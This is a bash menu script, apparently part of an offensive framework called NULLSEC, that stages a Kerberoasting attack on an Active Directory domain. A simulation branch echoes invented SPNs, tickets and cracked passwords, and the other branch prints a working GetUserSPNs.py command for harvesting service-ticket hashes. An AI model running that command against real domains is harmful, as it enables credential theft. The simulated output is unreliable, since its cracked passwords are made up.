#!/bin/bash
# NULLSEC Kerberoast - bad-antics development

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'
clear
echo -e "${RED}▓▓▓ NULLSEC KERBEROAST ▓▓▓${RESET} ${CYAN}[ bad-antics ]${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Domain: '${RESET})" DOMAIN; [ -z "$DOMAIN" ] && DOMAIN="corp.local"
read -p "$(echo -e ${WHITE}'  [>] DC IP: '${RESET})" DC_IP; [ -z "$DC_IP" ] && DC_IP="192.168.1.1"
read -p "$(echo -e ${WHITE}'  [>] Username: '${RESET})" USER; [ -z "$USER" ] && USER="jdoe"
read -p "$(echo -e ${WHITE}'  [>] Password: '${RESET})" PASS; [ -z "$PASS" ] && PASS="Password123"
read -p "$(echo -e ${WHITE}'  [>] Output file: '${RESET})" OUTPUT; [ -z "$OUTPUT" ] && OUTPUT="/tmp/hashes.txt"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE; TEST_MODE=${TEST_MODE:-n}
echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing Kerberoast attack"
    echo ""
    echo -e "${DIM}[*] Authenticating to $DC_IP as $USER@$DOMAIN...${RESET}"; sleep 0.5
    echo -e "${GREEN}[+]${RESET} Authentication successful"
    echo ""
    echo -e "${DIM}[*] Querying SPNs...${RESET}"; sleep 0.5
    spns=("sqlsvc/sql01.corp.local" "http/web01.corp.local" "mssql/db01.corp.local" "iis/iis01.corp.local")
    for spn in "${spns[@]}"; do
        user=$(echo $spn | cut -d'/' -f1)
        echo -e "${GREEN}[SPN]${RESET} $spn (${user}svc)"
    done
    echo ""
    echo -e "${DIM}[*] Requesting TGS tickets...${RESET}"; sleep 0.8
    echo -e "${GREEN}[+]${RESET} 4 tickets obtained"
    echo -e "${GREEN}[+]${RESET} Hashes saved to $OUTPUT"
    echo ""
    echo -e "${DIM}[*] Cracking with hashcat...${RESET}"; sleep 1
    echo -e "${GREEN}[CRACKED]${RESET} sqlsvc: Summer2024!"
    echo -e "${GREEN}[CRACKED]${RESET} mssqlsvc: Password123"
    echo ""
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Use Rubeus or GetUserSPNs.py:"
    echo -e "${DIM}    GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP -outputfile $OUTPUT${RESET}"
fi
